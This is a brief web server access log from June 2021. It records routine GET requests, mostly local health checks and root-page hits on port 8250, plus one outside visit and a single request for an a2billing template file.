[2021-06-12 15:07:55.816] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250//a2billing/customer/templates/default/footer.tpl 200 1ms
[2021-06-12 15:10:16.451] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
[2021-06-12 15:58:37.781] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
[2021-06-12 17:53:22.376] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
[2021-06-12 17:53:50.530] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
[2021-06-12 17:53:50.604] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/favicon.ico 200 1ms
[2021-06-12 18:30:55.166] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
[2021-06-12 18:58:54.590] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
[2021-06-12 19:08:51.161] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/actuator/health 200 0ms
[2021-06-12 19:13:22.730] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/actuator/health 200 0ms
[2021-06-12 19:39:39.917] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
[2021-06-12 19:44:01.662] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
[2021-06-12 19:53:34.434] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
[2021-06-12 20:24:18.752] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 1ms
[2021-06-12 21:04:53.519] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 1ms
[2021-06-12 22:32:35.410] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 1ms
[2021-06-12 22:32:51.736] [INFO] - [167.248.133.56] GET http://47.100.89.2:8250/ 200 1ms
[2021-06-12 22:51:01.679] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
